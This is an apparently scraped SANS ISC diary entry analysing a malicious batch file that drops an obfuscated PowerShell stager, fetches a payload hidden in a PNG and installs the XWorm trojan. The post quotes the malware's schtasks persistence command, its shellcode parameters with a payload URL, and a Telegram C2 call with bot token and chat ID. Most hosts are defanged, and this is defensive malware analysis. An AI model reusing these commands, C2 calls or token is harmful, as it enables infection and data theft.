---
ai_commentary: []
ai_commentary_meta:
  content_digest: ''
  generated_at: ''
  model: ''
  prompt_version: ''
  provider: ''
category: ai-security
date: '2026-02-04T10:15:14.943517+00:00'
exported_at: '2026-02-04T10:15:17.089747+00:00'
feed: https://isc.sans.edu/rssfeed.xml
language: en
source_url: https://isc.sans.edu/diary/rss/32682
structured_data:
  about: []
  author: ''
  description: 'Malicious Script Delivering More Maliciousness, Author: Xavier Mertens'
  headline: Malicious Script Delivering More Maliciousness, (Wed, Feb 4th)
  inLanguage: en
  keywords: []
  main_image: ''
  original_source: https://isc.sans.edu/diary/rss/32682
  publisher:
    logo: /favicon.ico
    name: gtcode.com
title: Malicious Script Delivering More Maliciousness, (Wed, Feb 4th)
updated_at: '2026-02-04T10:15:14.943517+00:00'
url_hash: 74c819b358dc8d2240f54558612ef5052f8063fb
---

Today, I received an interesting email with a malicious attachment. When I had a look at the automatic scan results, it seemed to be a malicious script to create a Chrome Injector to steal data. Because InfoStealers are very common these days, it looked “legit” but there was something different. The .bat file looks to be a fork of the one found in many GitHub repositories[
[1](https://github.com/00nx/Chrome-App-Bound-Encryption-Bypass/blob/main/make.bat)
].

When the regular script is completed, it jumps to :EndScript:

```
goto :EndScript
```

A call to :show\_msgbox was added at the script end:

```
:EndScript
endlocal
call :show_msgbox
exit /b
```

Then, the magic begins. A payload is obfuscated with junk characters:

![](https://isc.sans.edu/diaryimages/images/isc-20260204-1.png)

Very common techniques, the string is poluted with junk characters. It’s a chunk of Base64-encode data that is executed through a PowerShell:

![](https://isc.sans.edu/diaryimages/images/isc-20260204-2.png)

It fetches a payload from hxxps://uniworldrivercruises-co[.]uk/optimized\_MSI.png. This is a real picture:

![](https://isc.sans.edu/diaryimages/images/isc-20260204-4.png)

But when some “fun” at the end. The next payload is delimited (and extracted) using the tags “BaseStart-” and “-BaseEnd”:

![](https://isc.sans.edu/diaryimages/images/isc-20260204-3.png)

It’s a shell code that is invoked with the following parameters:

```
'==gN1V3dl5UQy8SZslmZvkGch9SbvNmLulWYyRGblhXaw9yL6MHc0RHa','0','C:\Users\Public\Downloads\','VHkaJZD8Iq','appidtel','1','appidtel','1','hxxp://178[.]16[.]53[.]209/buildingmoney.txt','C:\Users\Public\Downloads\','VHkaJZD8Iq','bat','1','0','4spTcCaYQA','0','','',''
```

The URL points to another payload. When I tried to decode it (it was Base64 encode and reversed), I could not automatically decode it because there was weird (non hex) characters in the string. Thanks to ChatGPT, I decoded it with the following piece of Python script:

```
from pathlib import Path
import re
import binascii

input_file = Path("payload.txt")
output_file = Path("payload.bin")

raw = input_file.read_bytes()
ascii_data = raw.decode("ascii", errors="ignore")

# Keep only hex characters!!
clean_hex = re.sub(r"[^0-9a-fA-F]", "", ascii_data)
if len(clean_hex) % 2 != 0:
    raise ValueError("Odd-length hex string after cleanup")

clean_hex = clean_hex[::-1]
binary = binascii.unhexlify(clean_hex)
output_file.write_bytes(binary)

print(f"[+] Decoded {len(binary)} bytes to {output_file}")
```

The decoded payload (SHA256:d99318c9b254b4fa5bf6f1dd15996dd50be0676dd84e822503fd273316eb9ba7) is a .Net program. It implements persistence thtough a scheduled task:

```
C:\Windows\System32\schtasks.exe" /create /f /sc minute /mo 1 /tn "Chromiumx2" /tr "C:\Users\admin\AppData\Roaming\Chromiumx2.exe
```

And uses Telegram as C2:

```
hxxps://api[.]telegram[.]org/bot7409572452:AAGp8Ak5bqZu2IkEdggJaz2mnMYRTkTjv-U/sendMessage?chat_id=6870183115&text=%E2%98%A0%20%5BXWorm%20V7.0%20@XCoderTools%5D%0D%0A%0D%0ANew%20CLient%20:%20%0D%0ACAECEB6F4379122BA468%0D%0A%0D%0AUserName%20:%20admin%0D%0AOSFullName%20:%20Microsoft%20Windows%2010%20Pro%0D%0AUSB%20:%20False%0D%0ACPU%20:%20AMD%20Ryzen%205%203500%206-Core%20Processor%0D%0AGPU%20:%20Microsoft%20Basic%20Display%20Adapter%20%0D%0ARAM%20:%205.99%20GB%0D%0AGroup%20:%20XWorm%20V7.1
```

It's another piece of XWorm! Interesting way to drop the trojan in another malicious script...

[1]
<https://github.com/00nx/Chrome-App-Bound-Encryption-Bypass/blob/main/make.bat>

Xavier Mertens (@xme)

Xameco

Senior ISC Handler - Freelance Cyber Security Consultant

[PGP Key](https://keybase.io/xme/key.asc)